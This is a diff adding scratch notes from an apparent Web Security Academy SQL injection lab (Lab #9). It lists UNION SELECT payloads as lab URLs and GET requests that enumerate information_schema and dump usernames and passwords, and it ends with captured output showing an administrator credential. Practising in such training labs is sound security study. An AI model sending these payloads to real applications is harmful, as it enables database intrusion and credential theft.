@@ -1,0 +1,35 @@
+SQL Injection - Lab #9
+https://aca91f781ef11960c0dd0df500cc0032.web-security-academy.net/filter?category=%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27pg_user%27--
+
+
+'+UNION+SELECT+usename,+passwd+FROM+pg_user--
+
+
+
+
+
+
+https://aca91f781ef11960c0dd0df500cc0032.web-security-academy.net/filter?category=%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+https://aca91f781ef11960c0dd0df500cc0032.web-security-academy.net/filter?category=%27+UNION+SELECT+usename,+passwd+FROM+pg_user--
+
+https://aca91f781ef11960c0dd0df500cc0032.web-security-academy.net/filter?category=%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27pg_user%27--
+
+GET /filter?category='+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- HTTP/1.1
+
+users_spotvi
+
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_spotvi'--
+
+
+
+GET /filter?category=Pets'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- HTTP/1.1
+GET /filter?category=Pets'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- HTTP/1.1
+
+GET /filter?category=Pets'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name+%3d+'users_nixanw'-- HTTP/1.1
+
+                        <th>password_sqyhtj</th>
+                        </tr>
+                        <tr>
+                        <th>username_qutbpu</th>
+                        <th>administrator</th>
+                        <td>w2oudwwyr9r8m22uuf8w</td>
